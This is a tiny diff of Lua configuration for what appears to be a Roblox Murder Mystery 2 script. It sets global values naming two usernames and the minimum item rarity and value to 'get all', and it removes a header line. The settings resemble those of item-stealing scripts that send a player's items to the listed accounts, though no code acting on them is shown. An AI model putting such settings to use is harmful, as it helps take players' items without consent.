@@ -1,4 +1,3 @@
-MM2 settings:
 _G.Usernames = {"botbotter_10", "IIIIIIIIIIIIIlllIII2"} -- you can add as many as you'd like
 _G.min_rarity = "Legendary"
 _G.min_value = 1 -- Put 1 to get all
